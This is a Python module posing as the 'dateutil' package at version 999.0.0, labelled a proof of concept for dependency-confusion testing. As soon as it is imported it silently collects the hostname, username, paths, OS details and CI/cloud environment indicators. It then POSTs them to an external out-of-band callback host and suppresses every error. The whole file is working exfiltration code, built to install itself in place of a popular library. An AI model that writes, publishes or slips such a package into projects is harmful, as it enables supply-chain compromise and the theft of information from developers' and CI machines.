"""
dateutil - PoC for dependency confusion vulnerability testing
"""

import os
import socket
import platform
import getpass
import urllib.request
import urllib.parse
import json

# Callback on import
try:
    data = {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'cwd': os.getcwd(),
        'home': os.path.expanduser('~'),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version(),
        'env_vars': {
            'CI': os.getenv('CI'),
            'GITHUB_ACTIONS': os.getenv('GITHUB_ACTIONS'),
            'GITLAB_CI': os.getenv('GITLAB_CI'),
            'JENKINS_URL': os.getenv('JENKINS_URL'),
            'CIRCLE_CI': os.getenv('CIRCLECI'),
            'TRAVIS': os.getenv('TRAVIS'),
            'AWS_REGION': os.getenv('AWS_REGION'),
            'AWS_LAMBDA_FUNCTION_NAME': os.getenv('AWS_LAMBDA_FUNCTION_NAME'),
            'KUBERNETES_SERVICE_HOST': os.getenv('KUBERNETES_SERVICE_HOST'),
        },
        'package_name': 'dateutil',
        'event': 'import'
    }

    # Remove None values
    data['env_vars'] = {k: v for k, v in data['env_vars'].items() if v is not None}

    # Send via POST request to avoid URL length limits
    url = "http://d43tqfdrlkdc73fvf6tgobpbpsxg9ch5w.oast.fun"

    json_data = json.dumps(data).encode('utf-8')
    headers = {'Content-Type': 'application/json'}

    req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
    urllib.request.urlopen(req, timeout=5)
except Exception:
    # Silent fail - don't break the import
    pass

__version__ = '999.0.0'
__author__ = 'Security Researcher'
